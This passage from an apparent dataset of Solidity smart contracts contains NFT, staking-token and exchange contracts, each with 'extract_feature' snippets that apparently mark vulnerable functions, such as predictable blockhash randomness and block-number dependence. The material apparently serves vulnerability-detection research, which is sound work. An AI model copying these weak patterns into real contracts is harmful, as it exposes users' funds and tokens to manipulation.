transferFrom(_from, _to, _tokenId);\n require(checkAndCallSafeTransfer(_from, _to, _tokenId, _data));\n }\n function isApprovedOrOwner(\n address _spender,\n uint256 _tokenId\n )\n internal\n view\n returns (bool)\n {\n address owner = ownerOf(_tokenId);\n return (\n _spender == owner ||\n getApproved(_tokenId) == _spender ||\n isApprovedForAll(owner, _spender)\n );\n }\n function _mint(address _to, uint256 _tokenId) internal {\n require(_to != address(0));\n addTokenTo(_to, _tokenId);\n emit Transfer(address(0), _to, _tokenId);\n }\n function _burn(address _owner, uint256 _tokenId) internal {\n clearApproval(_owner, _tokenId);\n removeTokenFrom(_owner, _tokenId);\n emit Transfer(_owner, address(0), _tokenId);\n }\n function clearApproval(address _owner, uint256 _tokenId) internal {\n require(ownerOf(_tokenId) == _owner);\n if (tokenApprovals[_tokenId] != address(0)) {\n tokenApprovals[_tokenId] = address(0);\n }\n }\n function addTokenTo(address _to, uint256 _tokenId) internal {\n require(tokenOwner[_tokenId] == address(0));\n tokenOwner[_tokenId] = _to;\n ownedTokensCount[_to] = ownedTokensCount[_to].add(1);\n }\n function removeTokenFrom(address _from, uint256 _tokenId) internal {\n require(ownerOf(_tokenId) == _from);\n ownedTokensCount[_from] = ownedTokensCount[_from].sub(1);\n tokenOwner[_tokenId] = address(0);\n }\n function checkAndCallSafeTransfer(\n address _from,\n address _to,\n uint256 _tokenId,\n bytes _data\n )\n internal\n returns (bool)\n {\n if (!_to.isContract()) {\n return true;\n }\n bytes4 retval = ERC721Receiver(_to).onERC721Received(\n msg.sender, _from, _tokenId, _data);\n return (retval == ERC721_RECEIVED);\n }\n}\ncontract ERC721Token is SupportsInterfaceWithLookup, ERC721BasicToken, ERC721 {\n string internal name_;\n string internal symbol_;\n mapping(address => uint256[]) internal ownedTokens;\n mapping(uint256 => uint256) internal ownedTokensIndex;\n uint256[] internal allTokens;\n mapping(uint256 => uint256) internal allTokensIndex;\n mapping(uint256 => string) internal tokenURIs;\n constructor(string _name, string _symbol) public {\n name_ = _name;\n symbol_ = _symbol;\n _registerInterface(InterfaceId_ERC721Enumerable);\n _registerInterface(InterfaceId_ERC721Metadata);\n }\n function name() external view returns (string) {\n return name_;\n }\n function symbol() external view returns (string) {\n return symbol_;\n }\n function tokenURI(uint256 _tokenId) public view returns (string) {\n require(exists(_tokenId));\n return tokenURIs[_tokenId];\n }\n function tokenOfOwnerByIndex(\n address _owner,\n uint256 _index\n )\n public\n view\n returns (uint256)\n {\n require(_index < balanceOf(_owner));\n return ownedTokens[_owner][_index];\n }\n function totalSupply() public view returns (uint256) {\n return allTokens.length;\n }\n function tokenByIndex(uint256 _index) public view returns (uint256) {\n require(_index < totalSupply());\n return allTokens[_index];\n }\n function _setTokenURI(uint256 _tokenId, string _uri) internal {\n require(exists(_tokenId));\n tokenURIs[_tokenId] = _uri;\n }\n function addTokenTo(address _to, uint256 _tokenId) internal {\n super.addTokenTo(_to, _tokenId);\n uint256 length = ownedTokens[_to].length;\n ownedTokens[_to].push(_tokenId);\n ownedTokensIndex[_tokenId] = length;\n }\n function removeTokenFrom(address _from, uint256 _tokenId) internal {\n super.removeTokenFrom(_from, _tokenId);\n uint256 tokenIndex = ownedTokensIndex[_tokenId];\n uint256 lastTokenIndex = ownedTokens[_from].length.sub(1);\n uint256 lastToken = ownedTokens[_from][lastTokenIndex];\n ownedTokens[_from][tokenIndex] = lastToken;\n ownedTokens[_from].length--;\n ownedTokensIndex[_tokenId] = 0;\n ownedTokensIndex[lastToken] = tokenIndex;\n }\n function _mint(address _to, uint256 _tokenId) internal {\n super._mint(_to, _tokenId);\n allTokensIndex[_tokenId] = allTokens.length;\n allTokens.push(_tokenId);\n }\n function _burn(address _owner, uint256 _tokenId) internal {\n super._burn(_owner, _tokenId);\n if (bytes(tokenURIs[_tokenId]).length != 0) {\n delete tokenURIs[_tokenId];\n }\n uint256 tokenIndex = allTokensIndex[_tokenId];\n uint256 lastTokenIndex = allTokens.length.sub(1);\n uint256 lastToken = allTokens[lastTokenIndex];\n allTokens[tokenIndex] = lastToken;\n allTokens[lastTokenIndex] = 0;\n allTokens.length--;\n allTokensIndex[_tokenId] = 0;\n allTokensIndex[lastToken] = tokenIndex;\n }\n}\ncontract Nfties is ERC721Token {\n constructor() public ERC721Token(\"Nfties\",\"NFTIES\") { }\n struct Token{\n uint8 body;\n uint8 feet;\n uint8 head;\n uint8 mouth;\n uint8 extra;\n uint64 birthBlock;\n }\n Token[] private tokens;\n function create() public returns (uint256 _tokenId) {\n bytes32 sudoRandomButTotallyPredictable = keccak256(abi.encodePacked(totalSupply(),blockhash(block.number - 1)));\n uint8 body = (uint8(sudoRandomButTotallyPredictable[0])%5)+1;\n uint8 feet = (uint8(sudoRandomButTotallyPredictable[1])%5)+1;\n uint8 head = (uint8(sudoRandomButTotallyPredictable[2])%5)+1;\n uint8 mouth = (uint8(sudoRandomButTotallyPredictable[3])%5)+1;\n uint8 extra = (uint8(sudoRandomButTotallyPredictable[4])%5)+1;\n string memory tokenUri = createTokenUri(body,feet,head,mouth,extra);\n Token memory _newToken = Token({\n body: body,\n feet: feet,\n head: head,\n mouth: mouth,\n extra: extra,\n birthBlock: uint64(block.number)\n });\n _tokenId = tokens.push(_newToken) - 1;\n _mint(msg.sender,_tokenId);\n _setTokenURI(_tokenId, tokenUri);\n emit Create(_tokenId,msg.sender,body,feet,head,mouth,extra,_newToken.birthBlock,tokenUri);\n return _tokenId;\n }\n event Create(\n uint _id,\n address indexed _owner,\n uint8 _body,\n uint8 _feet,\n uint8 _head,\n uint8 _mouth,\n uint8 _extra,\n uint64 _birthBlock,\n string _uri\n );\n function get(uint256 _id) public view returns (address owner,uint8 body,uint8 feet,uint8 head,uint8 mouth,uint8 extra,uint64 birthBlock) {\n return (\n tokenOwner[_id],\n tokens[_id].body,\n tokens[_id].feet,\n tokens[_id].head,\n tokens[_id].mouth,\n tokens[_id].extra,\n tokens[_id].birthBlock\n );\n }\n function tokensOfOwner(address _owner) public view returns(uint256[]) {\n return ownedTokens[_owner];\n }\n function createTokenUri(uint8 body,uint8 feet,uint8 head,uint8 mouth,uint8 extra) internal returns (string){\n string memory uri = \"https:\n uri = appendUint8ToString(uri,body);\n uri = strConcat(uri,\"-\");\n uri = appendUint8ToString(uri,feet);\n uri = strConcat(uri,\"-\");\n uri = appendUint8ToString(uri,head);\n uri = strConcat(uri,\"-\");\n uri = appendUint8ToString(uri,mouth);\n uri = strConcat(uri,\"-\");\n uri = appendUint8ToString(uri,extra);\n uri = strConcat(uri,\".png\");\n return uri;\n }\n function appendUint8ToString(string inStr, uint8 v) internal constant returns (string str) {\n uint maxlength = 100;\n bytes memory reversed = new bytes(maxlength);\n uint i = 0;\n while (v != 0) {\n uint remainder = v % 10;\n v = v / 10;\n reversed[i++] = byte(48 + remainder);\n }\n bytes memory inStrb = bytes(inStr);\n bytes memory s = new bytes(inStrb.length + i);\n uint j;\n for (j = 0; j < inStrb.length; j++) {\n s[j] = inStrb[j];\n }\n for (j = 0; j < i; j++) {\n s[j + inStrb.length] = reversed[i - 1 - j];\n }\n str = string(s);\n }\n function strConcat(string _a, string _b) internal pure returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n string memory ab = new string(_ba.length + _bb.length);\n bytes memory bab = bytes(ab);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) bab[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) bab[k++] = _bb[i];\n return string(bab);\n }\n}",
  "extract_feature": [
    "function create() public returns (uint256 _tokenId) {\nbytes32 sudoRandomButTotallyPredictable = keccak256(abi.encodePacked(totalSupply(),blockhash(block.number - 1)));\nuint8 body = (uint8(sudoRandomButTotallyPredictable[0])%5)+1;\nuint8 feet = (uint8(sudoRandomButTotallyPredictable[1])%5)+1;\nuint8 head = (uint8(sudoRandomButTotallyPredictable[2])%5)+1;\nuint8 mouth = (uint8(sudoRandomButTotallyPredictable[3])%5)+1;\nuint8 extra = (uint8(sudoRandomButTotallyPredictable[4])%5)+1;\nstring memory tokenUri = createTokenUri(body,feet,head,mouth,extra);\nToken memory _newToken = Token({\nbody: body,\nfeet: feet,\nhead: head,\nmouth: mouth,\nextra: extra,\nbirthBlock: uint64(block.number)\n});\n_tokenId = tokens.push(_newToken) - 1;\n_mint(msg.sender,_tokenId);\n_setTokenURI(_tokenId, tokenUri);\nemit Create(_tokenId,msg.sender,body,feet,head,mouth,extra,_newToken.birthBlock,tokenUri);\nreturn _tokenId;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6c750a970a4fdc0b7e"
  },
  "filename": "3534.sol",
  "content": "pragma solidity 0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n owner = newOwner;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StakerToken {\n uint256 public stakeStartTime;\n uint256 public stakeMinAge;\n uint256 public stakeMaxAge;\n function mint() public returns (bool);\n function coinAge() public view returns (uint256);\n function annualInterest() public view returns (uint256);\n event Mint(address indexed _address, uint _reward);\n}\ncontract Staker is ERC20,StakerToken,Ownable {\n using SafeMath for uint256;\n string public name = \"Staker\";\n string public symbol = \"STR\";\n uint public decimals = 18;\n uint public chainStartTime;\n uint public chainStartBlockNumber;\n uint public stakeStartTime;\n uint public stakeMinAge = 3 days;\n uint public stakeMaxAge = 90 days;\n uint public maxMintProofOfStake = 10**17;\n uint public totalSupply;\n uint public maxTotalSupply;\n uint public totalInitialSupply;\n struct transferInStruct{\n uint128 amount;\n uint64 time;\n }\n mapping(address => uint256) balances;\n mapping(address => mapping (address => uint256)) allowed;\n mapping(address => transferInStruct[]) transferIns;\n modifier canPoSMint() {\n require(totalSupply < maxTotalSupply);\n _;\n }\n constructor() public {\n maxTotalSupply = 7785000000000000000000000;\n totalInitialSupply = 1785000000000000000000000;\n chainStartTime = 1524771589;\n chainStartBlockNumber = 5510803;\n balances[msg.sender] = totalInitialSupply;\n totalSupply = totalInitialSupply;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n if(msg.sender == _to) return mint();\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n if(transferIns[msg.sender].length > 0) delete transferIns[msg.sender];\n uint64 _now = uint64(now);\n transferIns[msg.sender].push(transferInStruct(uint128(balances[msg.sender]),_now));\n transferIns[_to].push(transferInStruct(uint128(_value),_now));\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n uint256 _allowance = allowed[_from][msg.sender];\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = _allowance.sub(_value);\n emit Transfer(_from, _to, _value);\n if(transferIns[_from].length > 0) delete transferIns[_from];\n uint64 _now = uint64(now);\n transferIns[_from].push(transferInStruct(uint128(balances[_from]),_now));\n transferIns[_to].push(transferInStruct(uint128(_value),_now));\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n require((_value == 0) || (allowed[msg.sender][_spender] == 0));\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function mint() canPoSMint public returns (bool) {\n if(balances[msg.sender] <= 0) return false;\n if(transferIns[msg.sender].length <= 0) return false;\n uint reward = getProofOfStakeReward(msg.sender);\n if(reward <= 0) return false;\n totalSupply = totalSupply.add(reward);\n balances[msg.sender] = balances[msg.sender].add(reward);\n delete transferIns[msg.sender];\n transferIns[msg.sender].push(transferInStruct(uint128(balances[msg.sender]),uint64(now)));\n emit Mint(msg.sender, reward);\n return true;\n }\n function getBlockNumber() public view returns (uint blockNumber) {\n blockNumber = block.number.sub(chainStartBlockNumber);\n }\n function coinAge() public view returns (uint myCoinAge) {\n myCoinAge = getCoinAge(msg.sender,now);\n }\n function annualInterest() public view returns(uint interest) {\n uint _now = now;\n interest = maxMintProofOfStake;\n if((_now.sub(stakeStartTime)).div(365 days) == 0) {\n interest = (770 * maxMintProofOfStake).div(100);\n } else if((_now.sub(stakeStartTime)).div(365 days) == 1){\n interest = (435 * maxMintProofOfStake).div(100);\n }\n }\n function getProofOfStakeReward(address _address) internal view returns (uint) {\n require( (now >= stakeStartTime) && (stakeStartTime > 0) );\n uint _now = now;\n uint _coinAge = getCoinAge(_address, _now);\n if(_coinAge <= 0) return 0;\n uint interest = maxMintProofOfStake;\n if((_now.sub(stakeStartTime)).div(365 days) == 0) {\n interest = (770 * maxMintProofOfStake).div(100);\n } else if((_now.sub(stakeStartTime)).div(365 days) == 1){\n interest = (435 * maxMintProofOfStake).div(100);\n }\n return (_coinAge * interest).div(365 * (10**decimals));\n }\n function getCoinAge(address _address, uint _now) internal view returns (uint _coinAge) {\n if(transferIns[_address].length <= 0) return 0;\n for (uint i = 0; i < transferIns[_address].length; i++){\n if( _now < uint(transferIns[_address][i].time).add(stakeMinAge) ) continue;\n uint nCoinSeconds = _now.sub(uint(transferIns[_address][i].time));\n if( nCoinSeconds > stakeMaxAge ) nCoinSeconds = stakeMaxAge;\n _coinAge = _coinAge.add(uint(transferIns[_address][i].amount) * nCoinSeconds.div(1 days));\n }\n }\n function ownerSetStakeStartTime(uint timestamp) onlyOwner public {\n require((stakeStartTime <= 0) && (timestamp >= chainStartTime));\n stakeStartTime = timestamp;\n }\n function batchTransfer(address[] _recipients, uint[] _values) onlyOwner public returns (bool) {\n require( _recipients.length > 0 && _recipients.length == _values.length);\n uint total = 0;\n for(uint i = 0; i < _values.length; i++){\n total = total.add(_values[i]);\n }\n require(total <= balances[msg.sender]);\n uint64 _now = uint64(now);\n for(uint j = 0; j < _recipients.length; j++){\n balances[_recipients[j]] = balances[_recipients[j]].add(_values[j]);\n transferIns[_recipients[j]].push(transferInStruct(uint128(_values[j]),_now));\n emit Transfer(msg.sender, _recipients[j], _values[j]);\n }\n balances[msg.sender] = balances[msg.sender].sub(total);\n if(transferIns[msg.sender].length > 0) delete transferIns[msg.sender];\n if(balances[msg.sender] > 0) transferIns[msg.sender].push(transferInStruct(uint128(balances[msg.sender]),_now));\n return true;\n }\n}",
  "extract_feature": [
    "function getBlockNumber() public view returns (uint blockNumber) {\nblockNumber = block.number.sub(chainStartBlockNumber);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6c750a970a4fdc0b7f"
  },
  "filename": "3574.sol",
  "content": "pragma solidity ^0.4.9;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function assert(bool assertion) internal {\n if (!assertion) throw;\n }\n}\ncontract Token {\n function totalSupply() constant returns (uint256) {}\n function balanceOf(address _owner) constant returns (uint256) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n uint public decimals;\n string public name;\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping(address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ReserveToken is StandardToken, SafeMath {\n address public minter;\n function ReserveToken() {\n minter = msg.sender;\n }\n function create(address account, uint amount) {\n if (msg.sender != minter) throw;\n balances[account] = safeAdd(balances[account], amount);\n totalSupply = safeAdd(totalSupply, amount);\n }\n function destroy(address account, uint amount) {\n if (msg.sender != minter) throw;\n if (balances[account] < amount) throw;\n balances[account] = safeSub(balances[account], amount);\n totalSupply = safeSub(totalSupply, amount);\n }\n}\ncontract AccountLevels {\n function accountLevel(address user) constant returns(uint) {}\n}\ncontract AccountLevelsTest is AccountLevels {\n mapping (address => uint) public accountLevels;\n function setAccountLevel(address user, uint level) {\n accountLevels[user] = level;\n }\n function accountLevel(address user) constant returns(uint) {\n return accountLevels[user];\n }\n}\ncontract BitDex is SafeMath {\n address public admin;\n address public feeAccount;\n address public accountLevelsAddr;\n uint public feeMake;\n uint public feeTake;\n uint public feeRebate;\n mapping (address => mapping (address => uint)) public tokens;\n mapping (address => mapping (bytes32 => bool)) public orders;\n mapping (address => mapping (bytes32 => uint)) public orderFills;\n event Order(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user);\n event Cancel(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s);\n event Trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, address get, address give);\n event Deposit(address token, address user, uint amount, uint balance);\n event Withdraw(address token, address user, uint amount, uint balance);\n function BitDex(address admin_, address feeAccount_, address accountLevelsAddr_, uint feeMake_, uint feeTake_, uint feeRebate_) {\n admin = admin_;\n feeAccount = feeAccount_;\n accountLevelsAddr = accountLevelsAddr_;\n feeMake = feeMake_;\n feeTake = feeTake_;\n feeRebate = feeRebate_;\n }\n function() {\n throw;\n }\n function changeAdmin(address admin_) {\n if (msg.sender != admin) throw;\n admin = admin_;\n }\n function changeAccountLevelsAddr(address accountLevelsAddr_) {\n if (msg.sender != admin) throw;\n accountLevelsAddr = accountLevelsAddr_;\n }\n function changeFeeAccount(address feeAccount_) {\n if (msg.sender != admin) throw;\n feeAccount = feeAccount_;\n }\n function changeFeeMake(uint feeMake_) {\n if (msg.sender != admin) throw;\n if (feeMake_ > feeMake) throw;\n feeMake = feeMake_;\n }\n function changeFeeTake(uint feeTake_) {\n if (msg.sender != admin) throw;\n if (feeTake_ > feeTake || feeTake_ < feeRebate) throw;\n feeTake = feeTake_;\n }\n function changeFeeRebate(uint feeRebate_) {\n if (msg.sender != admin) throw;\n if (feeRebate_ < feeRebate || feeRebate_ > feeTake) throw;\n feeRebate = feeRebate_;\n }\n function deposit() payable {\n tokens[0][msg.sender] = safeAdd(tokens[0][msg.sender], msg.value);\n Deposit(0, msg.sender, msg.value, tokens[0][msg.sender]);\n }\n function withdraw(uint amount) {\n if (tokens[0][msg.sender] < amount) throw;\n tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], amount);\n if (!msg.sender.call.value(amount)()) throw;\n Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);\n }\n function depositToken(address token, uint amount) {\n if (token==0) throw;\n if (!Token(token).transferFrom(msg.sender, this, amount)) throw;\n tokens[token][msg.sender] = safeAdd(tokens[token][msg.sender], amount);\n Deposit(token, msg.sender, amount, tokens[token][msg.sender]);\n }\n function withdrawToken(address token, uint amount) {\n if (token==0) throw;\n if (tokens[token][msg.sender] < amount) throw;\n tokens[token][msg.sender] = safeSub(tokens[token][msg.sender], amount);\n if (!Token(token).transfer(msg.sender, amount)) throw;\n Withdraw(token, msg.sender, amount, tokens[token][msg.sender]);\n }\n function balanceOf(address token, address user) constant returns (uint) {\n return tokens[token][user];\n }\n function order(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce) {\n bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\n orders[msg.sender][hash] = true;\n Order(tokenGet, amountGet, tokenGive, amountGive, expires, nonce, msg.sender);\n }\n function trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s, uint amount) {\n bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\n if (!(\n (orders[user][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == user) &&\n block.number <= expires &&\n safeAdd(orderFills[user][hash], amount) <= amountGet\n )) throw;\n tradeBalances(tokenGet, amountGet, tokenGive, amountGive, user, amount);\n orderFills[user][hash] = safeAdd(orderFills[user][hash], amount);\n Trade(tokenGet, amount, tokenGive, amountGive * amount / amountGet, user, msg.sender);\n }\n function tradeBalances(address tokenGet, uint amountGet, address tokenGive, uint amountGive, address user, uint amount) private {\n uint feeMakeXfer = safeMul(amount, feeMake) / (1 ether);\n uint feeTakeXfer = safeMul(amount, feeTake) / (1 ether);\n uint feeRebateXfer = 0;\n if (accountLevelsAddr != 0x0) {\n uint accountLevel = AccountLevels(accountLevelsAddr).accountLevel(user);\n if (accountLevel==1) feeRebateXfer = safeMul(amount, feeRebate) / (1 ether);\n if (accountLevel==2) feeRebateXfer = feeTakeXfer;\n }\n tokens[tokenGet][msg.sender] = safeSub(tokens[tokenGet][msg.sender], safeAdd(amount, feeTakeXfer));\n tokens[tokenGet][user] = safeAdd(tokens[tokenGet][user], safeSub(safeAdd(amount, feeRebateXfer), feeMakeXfer));\n tokens[tokenGet][feeAccount] = safeAdd(tokens[tokenGet][feeAccount], safeSub(safeAdd(feeMakeXfer, feeTakeXfer), feeRebateXfer));\n tokens[tokenGive][user] = safeSub(tokens[tokenGive][user], safeMul(amountGive, amount) / amountGet);\n tokens[tokenGive][msg.sender] = safeAdd(tokens[tokenGive][msg.sender], safeMul(amountGive, amount) / amountGet);\n }\n function testTrade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s, uint amount, address sender) constant returns(bool) {\n if (!(\n tokens[tokenGet][sender] >= amount &&\n availableVolume(tokenGet, amountGet, tokenGive, amountGive, expires, nonce, user, v, r, s) >= amount\n )) return false;\n return true;\n }\n function availableVolume(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s) constant returns(uint) {\n bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\n if (!(\n (orders[user][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == user) &&\n block.number <= expires\n )) return 0;\n uint available1 = safeSub(amountGet, orderFills[user][hash]);\n uint available2 = safeMul(tokens[tokenGive][user], amountGet) / amountGive;\n if (available1<available2) return available1;\n return available2;\n }\n function amountFilled(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s) constant returns(uint) {\n bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\n return orderFills[user][hash];\n }\n function cancelOrder(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, uint8 v, bytes32 r, bytes32 s) {\n bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\n if (!(orders[msg.sender][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == msg.sender)) throw;\n orderFills[msg.sender][hash] = amountGet;\n Cancel(tokenGet, amountGet, tokenGive, amountGive, expires, nonce, msg.sender, v, r, s);\n }\n}",
  "extract_feature": [
    "function trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s, uint amount) {\nbytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\nif (!(\n(orders[user][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == user) &&\nblock.number <= expires &&\nsafeAdd(orderFills[user][hash], amount) <= amountGet\n)) throw;\ntradeBalances(tokenGet, amountGet, tokenGive, amountGive, user, amount);\norderFills[user][hash] = safeAdd(orderFills[user][hash], amount);\nTrade(tokenGet, amount, tokenGive, amountGive * amount / amountGet, user, msg.sender);\n}",
    "function availableVolume(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s) constant returns(uint) {\nbytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\nif (!(\n(orders[user][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == user) &&\nblock.number <= expires\n)) return 0;\nuint available1 = safeSub(amountGet, orderFills[user][hash]);\nuint available2 = safeMul(tokens[tokenGive][user], amountGet) / amountGive;\nif (available1<available2) return available1;\nreturn available2;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6c750a970a4fdc0b80"
  },
  "filename": "3689.sol",
  "content": "pragma solidity ^0.4.24;\ncontract TokenController {\n function proxyPayments(address _owner) public payable returns(bool);\n function onTransfer(address _from, address _to, uint _amount) public returns(bool);\n function onApprove(address _owner, address _spender, uint _amount) public returns(bool);\n}\ncontract ApproveAndCallFallBack {\n function receiveApproval(address from, uint256 _amount, address _token, bytes _data) public;\n}\ncontract EthertoteToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n uint public _totalSupply;\n string public version;\n address public contractOwner;\n address public thisContractAddress;\n address public EthertoteAdminAddress;\n bool public tokenGenerationLock;\n address public controller;\n address public relinquishOwnershipAddress = 0x0000000000000000000000000000000000000000;\n modifier onlyController {\n require(\n msg.sender == controller\n );\n _;\n }\n modifier onlyContract {\n require(\n address(this) == thisContractAddress\n );\n _;\n }\n modifier EthertoteAdmin {\n require(\n msg.sender == EthertoteAdminAddress\n );\n _;\n }\n struct Checkpoint {\n uint128 fromBlock;\n uint128 value;\n }\n EthertoteToken private parentToken;\n uint private parentSnapShotBlock;\n uint public creationBlock;\n mapping (address => Checkpoint[]) balances;\n mapping (address => mapping (address => uint256)) allowed;\n Checkpoint[] totalSupplyHistory;\n bool public transfersEnabled;\n constructor() public {\n controller = msg.sender;\n EthertoteAdminAddress = msg.sender;\n tokenGenerationLock = false;\n name = \"Ethertote\";\n symbol = \"TOTE\";\n decimals = 0;\n _totalSupply = 10000000 * 10**uint(decimals);\n version = \"Ethertote Token contract - version 1.0\";\n contractOwner = msg.sender;\n thisContractAddress = address(this);\n transfersEnabled = true;\n creationBlock = block.number;\n generateTokens(contractOwner, _totalSupply);\n controller = relinquishOwnershipAddress;\n }\n function totalSupply() public constant returns (uint) {\n return totalSupplyAt(block.number);\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balanceOfAt(_owner, block.number);\n }\n function allowance(address _owner, address _spender\n ) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function transfer(address _to, uint256 _amount\n ) public returns (bool success) {\n require(transfersEnabled);\n require(_to != address(this) );\n require(_to != 0x0);\n doTransfer(msg.sender, _to, _amount);\n return true;\n }\n function approve(address _spender, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n require((_amount == 0) || (allowed[msg.sender][_spender] == 0));\n if (isContract(controller)) {\n require(TokenController(controller).onApprove(msg.sender, _spender, _amount));\n }\n allowed[msg.sender][_spender] = _amount;\n emit Approval(msg.sender, _spender, _amount);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _amount\n ) public returns (bool success) {\n require(_to != address(this) );\n require(_to != 0x0);\n if (msg.sender != controller) {\n require(transfersEnabled);\n require(allowed[_from][msg.sender] >= _amount);\n allowed[_from][msg.sender] -= _amount;\n }\n doTransfer(_from, _to, _amount);\n return true;\n }\n event Transfer(\n address indexed _from, address indexed _to, uint256 _amount\n );\n event Approval(\n address indexed _owner, address indexed _spender, uint256 _amount\n );\n function changeController(address _newController) onlyController private {\n controller = _newController;\n }\n function doTransfer(address _from, address _to, uint _amount) internal {\n if (_amount == 0) {\n emit Transfer(_from, _to, _amount);\n return;\n }\n require(parentSnapShotBlock < block.number);\n require(_to != address(this));\n uint previousBalanceFrom = balanceOfAt(_from, block.number);\n require(previousBalanceFrom 